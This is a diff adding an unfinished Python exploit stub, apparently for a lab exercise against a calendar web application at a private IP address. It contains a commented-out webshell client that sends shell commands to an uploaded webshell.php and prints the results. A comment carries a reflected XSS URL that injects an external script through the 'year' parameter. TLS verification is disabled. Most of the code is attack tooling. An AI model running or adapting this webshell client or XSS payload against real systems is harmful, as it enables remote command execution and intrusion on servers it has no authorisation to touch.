@@ -1,0 +1,24 @@
+import requests, sys
+
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+#def webshell(SERVER_URL):
+#    try:
+#        while True:
+#            cmd = raw_input('C:\\ ')
+#            command = {'cmd': cmd}
+#            r2 = s.get(SERVER_URL+'uploads/webshell.php', params=command, verify=False)
+#            response = r2.text
+#            print(response)
+#    except:
+#        print("\r\nExiting.")
+#        sys.exit(-1)
+
+if __name__ == "__main__":
+# http://172.16.65.130/calendar/calendar.php?year=%3Cscript%20src=%27http://127.0.0.1/script.js%27/%3E&month=05#
+    RHOST = '172.16.65.130'
+    RPORT = '80'
+    WEB_SERVER = 'http://'+RHOST+':'+RPORT+'/calendar/'
+    #rXSS = 
+    #print("Reflected XSS URL:   "+WEB_SERVER+rXSS)
+#    webshell(WEB_SERVER)
